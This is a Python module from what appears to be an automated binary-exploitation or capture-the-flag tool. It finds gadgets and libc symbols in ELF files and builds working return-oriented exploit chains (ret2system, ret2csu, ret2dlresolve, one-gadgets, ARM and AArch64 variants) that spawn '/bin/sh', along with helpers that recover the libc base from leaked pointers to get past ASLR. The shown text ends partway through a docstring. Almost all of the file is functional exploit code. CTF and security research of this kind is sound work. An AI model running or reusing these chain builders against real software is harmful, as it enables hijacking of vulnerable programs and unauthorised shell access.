"""ROP / ret2system chain synthesis (Phase 9 frontier, assisted).

For a no-PIE x86-64 binary without a convenient "win" function, build a return-oriented chain
that calls `system("/bin/sh")`: a `pop rdi; ret` gadget loads the argument, a "/bin/sh" string
from the image is the argument, and `system@plt` is the call target. Deterministic and pure
stdlib (an objdump assist resolves the PLT stub when available). The stage confirms the chain
by reaching `system` under a breakpoint with RDI pointing at "/bin/sh".
"""
from __future__ import annotations

import re
import shutil
import struct
import subprocess

# useful x86-64 gadget byte patterns (the VA of the match is the gadget address)
GADGETS = {
    "pop_rdi": b"\x5f\xc3",           # pop rdi ; ret
    "pop_rsi": b"\x5e\xc3",           # pop rsi ; ret
    "pop_rdx": b"\x5a\xc3",           # pop rdx ; ret
    "ret": b"\xc3",                   # ret (stack alignment)
    "pop_rsi_r15": b"\x5e\x41\x5f\xc3",  # pop rsi ; pop r15 ; ret (libc_csu)
    "jmp_rsp": b"\xff\xe4",           # jmp rsp  -- redirect PC to the stack (ret2shellcode, no leak)
    "call_rsp": b"\xff\xd4",          # call rsp -- same, pushing a return first
}


def _loads(data):
    """PT_LOAD segments as (file_off, filesz, vaddr, flags), for ELFCLASS64 AND ELFCLASS32. The
    32-bit path is what lets the ARM gadget scan (and any 32-bit target) see executable segments --
    ELF32 program headers are 32 bytes with a different field order than ELF64's 56."""
    if len(data) < 52 or data[:4] != b"\x7fELF" or data[4] not in (1, 2):
        return []
    endc = "<" if data[5] == 1 else ">"
    if data[4] == 2:                                   # ELFCLASS64
        e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
        e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    else:                                              # ELFCLASS32
        e_phoff = struct.unpack_from(endc + "I", data, 28)[0]
        e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 42)
    out = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        if data[4] == 2:
            p_type, p_flags = struct.unpack_from(endc + "II", data, o)
            p_offset = struct.unpack_from(endc + "Q", data, o + 8)[0]
            p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
            p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        else:                                          # ELF32 phdr: type,off,vaddr,paddr,filesz,...,flags
            p_type, p_offset, p_vaddr, _paddr, p_filesz, _memsz, p_flags = \
                struct.unpack_from(endc + "7I", data, o)
        if p_type == 1:                                # PT_LOAD
            out.append((p_offset, p_filesz, p_vaddr, p_flags))
    return out


def _va_of(segs, file_off, need_x=False):
    for off, sz, va, flags in segs:
        if off <= file_off < off + sz and (not need_x or (flags & 1)):
            return va + (file_off - off)
    return None


def _find_exec(data: bytes, pat: bytes):
    segs = _loads(data)
    for off, sz, _va, flags in segs:
        if not (flags & 1):                            # executable segments only
            continue
        idx = data.find(pat, off, off + sz)
        if idx >= 0:
            return _va_of(segs, idx, need_x=True)
    return None


def find_gadget(data: bytes, name: str):
    """VA of the first occurrence of gadget `name` in an executable segment, or None."""
    pat = GADGETS.get(name)
    return _find_exec(data, pat) if pat else None


# __libc_csu_init gadgets (present in ELF binaries built against pre-glibc-2.34 startup and in
# many firmware/legacy targets). The pop gadget loads rbx/rbp/r12/r13/r14/r15; the call gadget
# does rdx=r15; rsi=r14; edi=r13d; call [r12+rbx*8] -- a full 3-argument controlled call.
CSU_POP = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3])
CSU_CALL = bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc])


def find_csu(data: bytes):
    """{'pop': va, 'call': va} for the __libc_csu_init ret2csu gadgets, or None."""
    pop = _find_exec(data, CSU_POP)
    call = _find_exec(data, CSU_CALL)
    return {"pop": pop, "call": call} if pop and call else None


# jmp/call <reg>: `FF /4` (jmp) and `FF /2` (call), modrm E0+reg / D0+reg. The register order is the
# x86 encoding order (rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi). A ret2shellcode redirect needs whichever
# register happens to point at the input buffer at the fault: rsp (shellcode sits after the return
# address), or a general register the callee left pointing at the buffer start (`jmp rax`, common
# when a read wrapper returns the buffer, is the canonical no-gadget-needed case after jmp rsp).
_REGS8 = ("rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi")


def find_reg_control_gadgets(data: bytes):
    """Every gadget that redirects the instruction pointer to an address already in a register, as
    [{insn, reg, va}]: `jmp <reg>` (FF /4), `call <reg>` (FF /2), and `push <reg>; ret` (50+reg C3)
    -- the last is at least as common as `jmp rsp` and, via `push rsp; ret`, lands in the exact same
    place, so it doubles the reach of a ret2shellcode that needs no info leak. reg is the register
    whose value the PC takes: rsp means the shellcode sits after the return address, any other
    register means it points at the buffer start. Ordered rsp first (the most common layout)."""
    out = []
    order = {"rsp": 0}
    for insn, pat in [("jmp", lambda i: bytes((0xFF, 0xE0 + i))),
                      ("call", lambda i: bytes((0xFF, 0xD0 + i))),
                      ("push+ret", lambda i: bytes((0x50 + i, 0xC3)))]:
        for i, reg in enumerate(_REGS8):
            va = _find_exec(data, pat(i))
            if va is not None:
                out.append({"insn": insn, "reg": reg, "va": va})
    out.sort(key=lambda g: (order.get(g["reg"], 1), g["reg"], g["insn"]))
    return out


def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0, align_ret=None):
    """ret2csu chain: pop-gadget loads rbx/rbp/r12=ptr/r13=edi/r14=rsi/r15=rdx, then the
    call-gadget does the 3-arg call *[ptr+rbx*8]. `align_ret` (a `ret` VA) prepends one return to
    fix the 16-byte-aligned rsp that system()/do_system needs -- the parity is environment-
    dependent, so a live caller tries both."""
    body = bytearray(_cyclic(offset))
    if align_ret is not None:
        body += struct.pack("<Q", align_ret & 0xFFFFFFFFFFFFFFFF)
    for w in (pop, rbx, rbp, ptr, edi, rsi, rdx, call):
        body += struct.pack("<Q", w & 0xFFFFFFFFFFFFFFFF)
    body += b"C" * 64                                  # post-call padding (breakpoint fires first)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def find_one_gadgets(data: bytes):
    """One-gadget candidates in a libc image: addresses that reach `execve("/bin/sh", ...)` in a
    single jump. Found without the external `one_gadget` tool (offline) by the byte pattern
    `lea rdi,[rip -> "/bin/sh"]` (48 8d 3d <disp32>) followed within a short window by a call to
    execve or an execve syscall (rax=0x3b; 0f 05). Jumping to the lea sets rdi="/bin/sh"; the site
    fires execve iff rsi and rdx are NULL at that moment -- so the constraint is recorded (whether
    the window zeroes them inline, in which case there is no precondition). Returns
    [{offset, constraint, execve}] sorted by offset (offset = VA of the lea = the one-gadget)."""
    segs = _loads(data)
    if not segs:
        return []
    binsh = find_string(data, b"/bin/sh")
    if binsh is None:
        return []
    syms = libc_symbols(data, ["execve"])
    execve_va = syms.get("execve")
    out, seen = [], set()
    for off, sz, va, fl in segs:
        if not (fl & 1):
            continue
        seg = data[off:off + sz]
        i = 0
        while True:
            j = seg.find(b"\x48\x8d\x3d", i)             # lea rdi, [rip + disp32]
            if j < 0 or j + 7 > len(seg):
                break
            i = j + 1
            disp = int.from_bytes(seg[j + 3:j + 7], "little", signed=True)
            site = va + j
            if site + 7 + disp != binsh:                 # rdi must resolve to "/bin/sh"
                continue
            win = seg[j + 7:j + 7 + 80]                  # look ahead for the execve call/syscall
            fires = False
            for k in range(0, len(win) - 4):
                if execve_va is not None and win[k] == 0xE8:   # call rel32 -> execve
                    tgt = (va + j + 7 + k) + 5 + int.from_bytes(win[k + 1:k + 5], "little", signed=True)
                    if tgt == execve_va:
                        fires = True
                        break
                if win[k] == 0xB8 and win[k + 1:k + 5] == b"\x3b\x00\x00\x00":   # mov eax,0x3b
                    fires = True
                    break
                if win[k:k + 7] == b"\x48\xc7\xc0\x3b\x00\x00\x00":              # mov rax,0x3b
                    fires = True
                    break
            if not fires:
                continue
            zsi = any(p in win for p in (b"\x31\xf6", b"\x45\x31\xf6", b"\x48\x31\xf6"))  # xor esi,esi
            zdx = any(p in win for p in (b"\x31\xd2", b"\x45\x31\xd2", b"\x48\x31\xd2"))  # xor edx,edx
            constraint = "none (rsi/rdx zeroed inline)" if (zsi and zdx) else \
                ("rdx==NULL" if zsi else ("rsi==NULL" if zdx else "rsi==NULL && rdx==NULL"))
            if site not in seen:
                seen.add(site)
                out.append({"offset": site, "constraint": constraint, "execve": execve_va})
    return sorted(out, key=lambda g: g["offset"])


def find_string(data: bytes, s: bytes):
    """VA of byte string `s` (NUL-terminated form preferred) in a loaded segment, or None."""
    segs = _loads(data)
    for probe in (s + b"\x00", s):
        for off, sz, _va, _fl in segs:
            idx = data.find(probe, off, off + sz)
            if idx >= 0:
                return _va_of(segs, idx)
    return None


def resolve_plt(exe_path, name: str):
    """Address of `<name@plt>` via objdump, or None (objdump absent / symbol not called)."""
    if not shutil.which("objdump"):
        return None
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe_path)],
                             capture_output=True, timeout=60, check=False).stdout.decode(
                                 "latin-1", "ignore")
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(r"^0*([0-9a-fA-F]+)\s+<" + re.escape(name) + r"(?:@plt)?>:", out, re.M)
    return int(m.group(1), 16) if m else None


def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length: int,
                     ret_gadget=None) -> bytes:
    """cyclic filler, then: [ret align] ; pop rdi ; &"/bin/sh" ; system."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)                       # 16-byte stack alignment for movaps
    chain += [pop_rdi, binsh, system]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


# --- ret2libc WITH a runtime leak (defeats ASLR without a `system` PLT entry) -------------------
# A modern challenge imports only puts/printf/read from libc -- never `system` -- and runs under
# ASLR, so neither a `system` PLT slot nor a fixed libc address exists. The classic answer is two
# stages over one connection: leak a libc pointer (call puts@plt on a GOT entry), subtract the
# symbol's known offset in THIS libc to recover the base, then re-trigger the overflow with a
# system("/bin/sh") chain built from base+offset. These helpers are the reusable primitives.

def _elf_class_endian(data: bytes):
    return (data[4] == 2, "<" if data[5] == 1 else ">")   # (is64, struct endian char)


def _sections(data: bytes) -> dict:
    """{section name: (offset, size, entsize)} from the section header table; {} on malformation."""
    try:
        is64, endc = _elf_class_endian(data)
        if is64:
            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x3A)
            fmt, off_i, sz_i, ent_i = endc + "IIQQQQIIQQ", 4, 5, 9
        else:
            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x2E)
            fmt, off_i, sz_i, ent_i = endc + "IIIIIIIIII", 4, 5, 9
        shs = [struct.unpack_from(fmt, data, e_shoff + i * e_shentsize) for i in range(e_shnum)]
        strtab_off = shs[e_shstrndx][off_i]

        def _name(o):
            end = data.find(b"\x00", strtab_off + o)
            return data[strtab_off + o:end].decode("latin-1", "replace")

        return {_name(sh[0]): (sh[off_i], sh[sz_i], sh[ent_i]) for sh in shs}
    except Exception:
        return {}


def libc_version(data: bytes):
    """(major, minor) of a glibc image, from the highest `GLIBC_2.NN` symbol-version string it
    carries. Every glibc exports versioned symbols up to its OWN release, so the max GLIBC_2.NN in
    the image is its version -- robust, needs no banner string, works on a stripped libc. Returns
    None when no such version string is present (not a glibc). Used to gate heap techniques
    correctly (hooks removed in 2.34, safe-linking in 2.32, tcache double-free key in 2.29, House of
    Force only <2.29) instead of assuming a fixed version."""
    import re as _re
    best = None
    for m in _re.finditer(rb"GLIBC_2\.(\d{1,3})\b", data):
        n = int(m.group(1))
        if best is None or n > best:
            best = n
    return (2, best) if best is not None else None


def libc_symbols(data: bytes, names) -> dict:
    """{name: st_value} for the requested EXPORTED symbols of a libc/.so, read straight from
    .dynsym. `st_value` is the unrelocated vaddr, so the runtime address is `libc_base + st_value`.
    Pure stdlib (no readelf/nm), best-effort: {} on any malformation."""
    secs = _sections(data)
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not ds or not st:
        return {}
    is64, endc = _elf_class_endian(data)
    entsize = ds[2] or (24 if is64 else 16)
    stroff = st[0]
    want, out = set(names), {}
    for o in range(ds[0], ds[0] + ds[1], entsize):
        try:
            if is64:
                st_name, _info, _oth, st_shndx, st_value, _sz = struct.unpack_from(
                    endc + "IBBHQQ", data, o)
            else:
                st_name, st_value, _sz, _info, _oth, st_shndx = struct.unpack_from(
                    endc + "IIIBBH", data, o)
        except struct.error:
            break
        if st_shndx == 0 or not st_value:            # undefined import, or no address -> skip
            continue
        end = data.find(b"\x00", stroff + st_name)
        nm = data[stroff + st_name:end].decode("latin-1", "replace")
        if nm in want and nm not in out:
            out[nm] = st_value
            if len(out) == len(want):
                break
    return out


def _libc_symbol_values(data: bytes) -> set:
    """Every DEFINED function/object symbol VALUE (unrelocated vaddr) in .dynsym -- the anchors a
    leaked libc pointer's page offset can be matched against, to recover the libc base."""
    secs = _sections(data)
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not ds:
        return set()
    is64, endc = _elf_class_endian(data)
    entsize = ds[2] or (24 if is64 else 16)
    vals = set()
    for o in range(ds[0], ds[0] + ds[1], entsize):
        try:
            if is64:
                _n, info, _oth, shndx, value, _sz = struct.unpack_from(endc + "IBBHQQ", data, o)
            else:
                _n, value, _sz, info, _oth, shndx = struct.unpack_from(endc + "IIIBBH", data, o)
        except struct.error:
            break
        if shndx != 0 and value and (info & 0xF) in (1, 2):   # STT_OBJECT / STT_FUNC, defined
            vals.add(value)
    return vals


# Distinctive libc symbols a real leak commonly discloses (FILE structs, environ, key functions);
# a curated anchor set so a stack/PIE value can't coincidentally corroborate a bogus base.
_LEAK_ANCHOR_SYMS = (
    "_IO_2_1_stdout_", "_IO_2_1_stderr_", "_IO_2_1_stdin_", "stdout", "stderr", "stdin",
    "environ", "__environ", "_environ", "_IO_file_jumps", "_IO_wfile_jumps",
    "__libc_start_main", "__free_hook", "__malloc_hook", "system", "puts", "printf",
    "read", "write", "malloc", "free", "setvbuf", "__stack_chk_fail", "exit")


def recover_libc_base(leaked, libc_data: bytes):
    """Recover a libc's load base from leaked runtime pointers, the same page-offset method as
    exploit.recover_pie_base but anchored on the LIBC's own exported symbols. A leaked pointer to a
    libc symbol (a FILE like _IO_2_1_stdout_, a function address in the GOT) has `& 0xfff` equal to
    that symbol's page offset; base = leaked - symbol. libc has thousands of symbols so a lone match
    is cheap coincidence, so a base is accepted only when >=2 DISTINCT leaked slots corroborate it.
    Returns the page-aligned base or None. NOTE: a bare return-address-into-libc (e.g. the
    __libc_start_call_main return commonly on the stack) is NOT a symbol start and will not match --
    that case needs a version-specific offset the caller must supply.

    Anchored on a CURATED set of distinctive, commonly-leaked symbols (the _IO_ FILE structs,
    environ, a few well-known functions) rather than all of libc's thousands: with thousands of
    anchors a stack/PIE value coincidentally matches some symbol's page offset ~every time, so two
    of them corroborate a bogus base (a leaked stack address masqueraded as libc). The curated set
    keeps the real leaks (stdout/stderr/environ/puts...) while making a false 2-way match unlikely."""
    anchors: dict = {}
    for va in libc_symbols(libc_data, _LEAK_ANCHOR_SYMS).values():
        anchors.setdefault(va & 0xFFF, []).append(va)
    if not anchors:
        return None
    support: dict = {}
    for v in leaked:
        v = int(v)
        if not (0x1000 <= v <= 0x7FFFFFFFFFFF):
            continue
        for va in anchors.get(v & 0xFFF, ()):
            base = v - va
            if base > 0 and (base & 0xFFF) == 0:
                support.setdefault(base, set()).add(v)
    best = max(support, key=lambda b: len(support[b]), default=None)
    if best is None or len(support[best]) < 2:
        return None
    return best


def got_entry(data: bytes, name: str):
    """The GOT slot the PLT stub for `name` dereferences, read from .rela.plt/.rel.plt. For a
    no-PIE binary this is the absolute address whose contents (the resolved libc function) a
    `puts(got)` leak prints -- so leaking it and subtracting the symbol's libc offset gives the
    libc base. Pure stdlib, best-effort: None if the reloc/symbol tables are absent."""
    secs = _sections(data)
    rela = secs.get(".rela.plt") or secs.get(".rel.plt")
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not rela or not ds or not st:
        return None
    is64, endc = _elf_class_endian(data)
    rel_ent = rela[2] or (24 if is64 else 8)
    sym_ent = ds[2] or (24 if is64 else 16)
    stroff = st[0]

    def _symname(idx):
        try:
            st_name = struct.unpack_from(endc + "I", data, ds[0] + idx * sym_ent)[0]
            end = data.find(b"\x00", stroff + st_name)
            return data[stroff + st_name:end].decode("latin-1", "replace")
        except struct.error:
            return ""

    for o in range(rela[0], rela[0] + rela[1], rel_ent):
        try:
            if is64:
                r_offset, r_info = struct.unpack_from(endc + "QQ", data, o)[:2]
                sym = r_info >> 32
            else:
                r_offset, r_info = struct.unpack_from(endc + "II", data, o)[:2]
                sym = r_info >> 8
        except struct.error:
            break
        if _symname(sym) == name:
            return r_offset
    return None


def got_entries(data: bytes) -> dict:
    """Every PLT GOT slot as {symbol_name: r_offset}, read from .rela.plt/.rel.plt. For a no-PIE
    target each r_offset is the absolute, writable address the PLT stub dereferences -- the set of
    arbitrary-write targets whose overwrite redirects a later call to that function. Pure stdlib,
    best-effort: {} when the reloc/symbol tables are absent."""
    secs = _sections(data)
    rela = secs.get(".rela.plt") or secs.get(".rel.plt")
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not rela or not ds or not st:
        return {}
    is64, endc = _elf_class_endian(data)
    rel_ent = rela[2] or (24 if is64 else 8)
    sym_ent = ds[2] or (24 if is64 else 16)
    stroff = st[0]

    def _symname(idx):
        try:
            st_name = struct.unpack_from(endc + "I", data, ds[0] + idx * sym_ent)[0]
            end = data.find(b"\x00", stroff + st_name)
            return data[stroff + st_name:end].decode("latin-1", "replace")
        except struct.error:
            return ""

    out: dict = {}
    for o in range(rela[0], rela[0] + rela[1], rel_ent):
        try:
            if is64:
                r_offset, r_info = struct.unpack_from(endc + "QQ", data, o)[:2]
                sym = r_info >> 32
            else:
                r_offset, r_info = struct.unpack_from(endc + "II", data, o)[:2]
                sym = r_info >> 8
        except struct.error:
            break
        name = _symname(sym)
        if name:
            out[name] = r_offset
    return out


def section_addr(data: bytes, name: str):
    """The runtime VADDR (sh_addr) of section `name`, or None. For a no-PIE target this is the
    fixed address of .rela.plt / .dynsym / .dynstr / .plt that a ret2dlresolve forges against."""
    try:
        is64, endc = _elf_class_endian(data)
        if is64:
            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
            she, shn, shx = struct.unpack_from(endc + "HHH", data, 0x3A)
            fmt = endc + "IIQQQQIIQQ"
        else:
            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
            she, shn, shx = struct.unpack_from(endc + "HHH", data, 0x2E)
            fmt = endc + "IIIIIIIIII"
        shs = [struct.unpack_from(fmt, data, e_shoff + i * she) for i in range(shn)]
        so = shs[shx][4]
        for sh in shs:
            end = data.find(b"\x00", so + sh[0])
            if data[so + sh[0]:end].decode("latin-1", "replace") == name and sh[3]:
                return sh[3]                            # sh_addr
    except Exception:
        pass
    return None


def has_bind_now(data: bytes) -> bool:
    """True if the target binds EAGERLY (full RELRO: DT_BIND_NOW / DF_BIND_NOW / DF_1_NOW). Lazy
    PLT resolution is then off, so ret2dlresolve does not apply -- the resolver is never reached
    through the PLT. Feasibility is a property of the TARGET binary, not the host's glibc, so this
    stays correct when the exploit later runs against a different (e.g. older) loader."""
    secs = _sections(data)
    dyn = secs.get(".dynamic")
    if not dyn:
        return False
    is64, endc = _elf_class_endian(data)
    off, size = dyn[0], dyn[1]
    ent = 16 if is64 else 8
    tagfmt = endc + ("qQ" if is64 else "iI")
    DT_BIND_NOW, DT_FLAGS, DT_FLAGS_1 = 24, 30, 0x6ffffffb
    for o in range(off, off + size, ent):
        try:
            tag, val = struct.unpack_from(tagfmt, data, o)
        except struct.error:
            break
        if tag == 0:                                   # DT_NULL: end of .dynamic
            break
        if tag == DT_BIND_NOW:
            return True
        if tag == DT_FLAGS and (val & 0x8):            # DF_BIND_NOW
            return True
        if tag == DT_FLAGS_1 and (val & 0x1):          # DF_1_NOW
            return True
    return False


def build_ret2dlresolve(offset, *, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
                        jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
                        align=False):
    """A leak-free ret2libc via the dynamic linker. Forge, in writable `scratch`, an Elf64_Rela +
    Elf64_Sym + the symbol string so that _dl_runtime_resolve resolves `symbol` (e.g. "system")
    and immediately calls it with rdi = &arg -- no libc leak, no `system` PLT entry needed. Works
    on ANY loader that still binds this target lazily (older glibc included; that is the common
    offline case), because everything forged comes from the TARGET binary's own tables.

    Returns (chain, data): the stage-1 ROP `chain` reads `data` into `scratch` via
    read(0, scratch, n), sets rdi = &arg, then drops into PLT0 with the forged reloc index.
    `align=True` inserts one `ret` for the 16-byte-aligned rsp system()/do_system needs -- the
    re-entered frame's parity is environment-dependent, so the caller detonates BOTH ways.
    """
    def q(v):
        return struct.pack("<Q", v & (2**64 - 1))

    def _aligned(a, base):                             # advance a to the next 24-byte grid vs base
        while (a - base) % 24:
            a += 1
        return a

    gotslot = scratch                                  # 8-byte slot the resolver writes into; kept
    sym_a = _aligned(scratch + 8, symtab)              # BEFORE the structures so its write can't
    rela_a = _aligned(sym_a + 24, jmprel)              # clobber the Sym/Rela or the arg string
    str_a = rela_a + 24                                # the symbol name string
    arg_a = str_a + len(symbol) + 1                    # the argument string (e.g. "/bin/sh")
    sym_index = (sym_a - symtab) // 24
    reloc_index = (rela_a - jmprel) // 24
    n = (arg_a + len(arg) + 1) - scratch

    data = bytearray(n)
    data[sym_a - scratch:sym_a - scratch + 24] = struct.pack(
        "<IBBHQQ", str_a - strtab, 0x12, 0, 0, 0, 0)   # st_name, st_info=STB_GLOBAL|STT_FUNC
    data[rela_a - scratch:rela_a - scratch + 24] = struct.pack(
        "<QQq", gotslot, (sym_index << 32) | 7, 0)     # r_offset, r_info=(sym<<32)|JMP_SLOT(7)
    data[str_a - scratch:str_a - scratch + len(symbol) + 1] = symbol + b"\x00"
    data[arg_a - scratch:arg_a - scratch + len(arg) + 1] = arg + b"\x00"

    chain = (b"A" * offset
             + q(pop_rdi) + q(0) + q(pop_rsi) + q(scratch) + q(pop_rdx) + q(n) + q(read_plt)
             + q(pop_rdi) + q(arg_a)
             + (q(ret_gadget) if align else b"")
             + q(plt0) + q(reloc_index))
    return bytes(chain), bytes(data)


def _jcc_at(seg, p):
    """True if seg[p:] begins an equality conditional jump: short jz/jnz (74/75) or the near
    two-byte forms (0f 84 / 0f 85). Compilers pick either depending on the branch distance."""
    if p < len(seg) and seg[p] in (0x74, 0x75):
        return True
    return p + 1 < len(seg) and seg[p] == 0x0F and seg[p + 1] in (0x84, 0x85)


def _s8(b):
    return b - 256 if b >= 128 else b


def _find_movabs(seg, start):
    """Index of the next `movabs r64, imm64` (REX.W prefix 0x48/0x49, opcode 0xB8..0xBF) at or
    after `start`, or -1. This is the only x86-64 instruction carrying a full 64-bit immediate."""
    x = max(0, start)
    n = len(seg)
    while x + 1 < n:
        if seg[x] in (0x48, 0x49) and 0xB8 <= seg[x + 1] <= 0xBF:
            return x
        x += 1
    return -1


def _local_load_disp(seg, lo, hi):
    """Signed rbp/rsp disp8 of a `mov r64, [rbp/rsp+disp8]` load in seg[lo:hi], or None. Used to
    recover the checked local's frame displacement for the 64-bit magic-gate shape."""
    for x in range(max(0, lo), min(hi, len(seg) - 3)):
        if seg[x] != 0x48 or seg[x + 1] != 0x8B:         # REX.W mov r64, r/m64
            continue
        modrm = seg[x + 2]
        if (modrm & 0xC7) == 0x45:                       # mod=01, rm=101 -> [rbp+disp8]
            return _s8(seg[x + 3])
        if (modrm & 0xC7) == 0x44 and x + 4 < len(seg) and seg[x + 3] == 0x24:  # [rsp+disp8]
            return _s8(seg[x + 4])
    return None


def find_br_gadgets_aarch64(data: bytes):
    """AArch64 `br <Xn>` / `blr <Xn>` gadgets, as [{insn, reg, va}] (reg 'x0'..'x30'). These branch
    the PC to a register's value -- the aarch64 equivalent of x86 `jmp <reg>`, and the only no-leak
    way to reach injected shellcode on the (ASLR'd) stack when a register points at the input
    buffer. Encodings: br Xn = 0xD61F0000 | (n<<5); blr Xn = 0xD63F0000 | (n<<5)."""
    out = []
    for insn, base in (("br", 0xD61F0000), ("blr", 0xD63F0000)):
        for n in range(31):                              # x0..x30 (x31 is xzr/sp, not a br target)
            va = _find_exec(data, struct.pack("<I", base | (n << 5)))
            if va is not None:
                out.append({"insn": insn, "reg": f"x{n}", "va": va})
    out.sort(key=lambda g: (int(g["reg"][1:]), g["insn"]))
    return out


_A64_RET = 0xD65F03C0                                    # ret (x30)
_A64_NOPS = {0xD503201F, 0xD50323BF, 0xD50323FF,         # nop, autiasp, autibsp
             0xD503235F, 0xD503239F}                     # autiaz, autibz (auth = nop under qemu)


def _a64_words(data: bytes):
    """(va, word) for every 4-byte instruction in executable segments (little-endian aarch64)."""
    for off, sz, va, flags in _loads(data):
        if not (flags & 1):
            continue
        for p in range(off, off + (sz & ~3) - 3, 4):
            yield va + (p - off), int.from_bytes(data[p:p + 4], "little")


def _a64_ldp_regs(w: int):
    """(Rt, Rt2, Rn) if `w` is a 64-bit LDP (post-index / signed-offset / pre-index), else None."""
    if (w & 0xFFC00000) in (0xA8C00000, 0xA9400000, 0xA9C00000):
        return w & 0x1F, (w >> 10) & 0x1F, (w >> 5) & 0x1F
    return None


def find_aarch64_r2libc_gadgets(data: bytes) -> dict:
    """AArch64 two-gadget ret2libc gadgets, decoded straight from the bytes (no objdump -- the host
    objdump cannot disassemble aarch64, so this is pure-stdlib like `find_br_gadgets_aarch64`):

      caller: `mov x0, xS ; blr xB`  -- set x0 from a callee-saved reg, then call another one.
      loader: `ldp xR1, xR2, [sp,..] ; ... ; ldp x29, x30, [sp], #M ; (auti*;) ret` -- pop two
              callee-saved regs AND the return address off the stack, then return.

    Chaining a loader whose {R1,R2} == a caller's {S,B} gives system("/bin/sh"): the loader sets
    xS=&"/bin/sh", xB=&system and x30=caller; the caller does x0=xS; blr xB. Returns
    {"callers":[{va,src,br}], "loaders":[{va,r1,r2}]} (reg indices). Pointer-authentication
    (`autiasp`) is a no-op under qemu-user, so those epilogues are usable gadgets."""
    words = list(_a64_words(data))
    callers, loaders = [], []
    for i in range(len(words) - 1):
        va, w = words[i]
        if (w & 0xFFE0FFFF) == 0xAA0003E0:               # mov x0, xS  (orr x0, xzr, xS)
            s = (w >> 16) & 0x1F
            w2 = words[i + 1][1]
            if (w2 & 0xFFFFFC1F) == 0xD63F0000 and s < 29:   # blr xB
                callers.append({"va": va, "src": s, "br": (w2 >> 5) & 0x1F})
    for i in range(len(words)):
        va, w = words[i]
        regs = _a64_ldp_regs(w)
        if not regs:
            continue
        r1, r2, rn = regs
        if rn != 31 or r1 in (29, 30, 31) or r2 in (29, 30, 31):
            continue                                     # must load two GPRs from sp
        for k in range(i + 1, min(i + 8, len(words))):
            wk = words[k][1]
            if wk in _A64_NOPS:
                continue
            lr = _a64_ldp_regs(wk)
            if lr and lr[0] == 29 and lr[1] == 30 and lr[2] == 31:   # ldp x29, x30, [sp], #M
                for j in range(k + 1, min(k + 4, len(words))):
                    wj = words[j][1]
                    if wj in _A64_NOPS:
                        continue
                    if wj == _A64_RET:
                        loaders.append({"va": va, "r1": r1, "r2": r2})
                    break
                break
            if lr and (lr[0] in (r1, r2) or lr[1] in (r1, r2)):
                break                                    # r1/r2 clobbered before the restore
    return {"callers": callers, "loaders": loaders}


def find_arm_r0pc_gadgets(data: bytes):
    """ARM (32-bit, ARM mode) `pop {r0, ..., pc}` gadgets -- LDMFD sp!, {rlist} with both r0 and pc
    in the list. LDM loads in register-number order from low memory, so r0 (lowest) comes off [sp]
    and pc (r15, highest) off the last slot: one gadget sets the first argument AND the return PC,
    the ARM32 ret2libc primitive (r0=&"/bin/sh", pc=&system). Returns [{va, nregs}] sorted by fewest
    popped words (cleanest stack layout first). Encoding: pop {rlist} = 0xE8BD0000 | rlist;
    r0=bit0, pc=bit15. Pure byte decode (the host objdump cannot disassemble ARM)."""
    out = []
    for va, w in _a64_words(data):                       # 4-byte little-endian words (reused)
        if (w & 0xFFFF0000) == 0xE8BD0000 and (w & 0x8001) == 0x8001:
            out.append({"va": va, "nregs": bin(w & 0xFFFF).count("1")})
    out.sort(key=lambda g: g["nregs"])
    return out


def find_bx_gadgets_arm(data: bytes):
    """ARM (32-bit, ARM mode) `bx <Rn>` / `blx <Rn>` gadgets, as [{insn, reg, va}] (reg r0..r14).
    The ARM `jmp <reg>` -- branch (with optional link) to a register's value -- the only no-leak way
    to reach injected ARM-mode shellcode on the ASLR'd stack when a register points at the buffer.
    Encodings: bx Rn = 0xE12FFF10 | n; blx Rn = 0xE12FFF30 | n."""
    out = []
    for insn, base in (("bx", 0xE12FFF10), ("blx", 0xE12FFF30)):
        for n in range(15):                              # r0..r14 (r15 is pc, not a bx source here)
            va = _find_exec(data, struct.pack("<I", base | n))
            if va is not None:
                out.append({"insn": insn, "reg": f"r{n}", "va": va})
    out.sort(key=lambda g: (int(g["reg"][1:]), g["insn"]))
    return out


def find_magic_gates(data: bytes):
    """Find a stack LOCAL checked against a magic constant that gates a branch (jeeves'
    `if (local==0x1337bab3)` -> read+print the flag). A stack overflow that writes IMM32 into the
    local satisfies the check without touching the return address. Two code shapes are recognised,
    each followed by an equality jump (short or near):

